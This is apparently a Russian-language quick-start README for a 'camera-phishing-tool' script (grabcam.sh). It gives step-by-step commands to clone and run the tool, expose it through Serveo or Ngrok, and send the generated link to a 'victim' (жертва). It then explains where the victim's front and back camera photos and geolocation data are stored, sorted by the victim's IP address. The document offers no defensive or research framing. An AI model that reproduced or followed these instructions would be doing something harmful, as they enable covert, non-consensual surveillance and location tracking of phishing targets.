# 🚀 Быстрый старт

## 📦 Установка за 3 шага

### 1. Клонирование репозитория
```bash
git clone https://github.com/yourusername/camera-phishing-tool.git
cd camera-phishing-tool
```

### 2. Установка прав
```bash
chmod +x grabcam.sh
```

### 3. Запуск
```bash
./grabcam.sh
```

## 🎯 Базовое использование

1. **Выберите метод порт-форвардинга:**
   - Нажмите `1` для Serveo (рекомендуется)
   - Или `2` для Ngrok

2. **Введите поддомен (опционально):**
   - Оставьте пустым для случайного поддомена
   - Или введите свой (например: `mycam123`)

3. **Скопируйте ссылку** и отправьте жертве

4. **Наблюдайте за результатами:**
   - Фотографии сохраняются в `Photo/[IP_ADDRESS]/`
   - Статистика отображается в реальном времени
   - Логи сохраняются в `activity.log`

## 📁 Где искать результаты

```
Photo/
└── [IP_ADDRESS]/
    ├── front/          # Фотографии с фронтальной камеры
    ├── back/           # Фотографии с задней камеры
    └── geo_info.txt    # Информация о геолокации
```

## ⚙️ Настройки

### Использование своего HTML шаблона

```bash
export HTML_TEMPLATE="my-template.html"
./grabcam.sh
```

Или просто переименуйте файл в `grabcam.html`

### Требования к HTML шаблону

- Должен содержать placeholder `forwarding_link` (будет заменен на вашу ссылку)
- Остальное добавится автоматически

## 🆘 Решение проблем

### Serveo не работает?
→ Попробуйте Ngrok (опция 2)

### Камера не запрашивается?
→ Проверьте консоль браузера (F12) на наличие ошибок

### Фотографии не сохраняются?
→ Проверьте права доступа к директории `Photo/`

---

**Готово! 🎉 Теперь вы можете начать использовать инструмент.**

